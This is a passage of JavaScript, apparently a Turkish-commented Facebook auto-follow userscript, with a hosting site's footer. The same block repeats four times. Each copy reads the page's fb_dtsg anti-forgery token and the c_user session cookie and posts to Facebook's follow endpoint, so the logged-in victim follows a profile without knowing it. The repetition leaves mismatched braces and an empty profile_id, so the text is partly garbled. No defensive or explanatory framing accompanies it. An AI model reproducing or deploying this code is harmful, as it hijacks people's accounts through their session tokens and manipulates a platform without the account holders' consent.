    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş





// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş







}

Because it's your web

Powered by monkeys and unicorns with the help of many friends

Policy & Guidelines: DMCA Privacy Policy
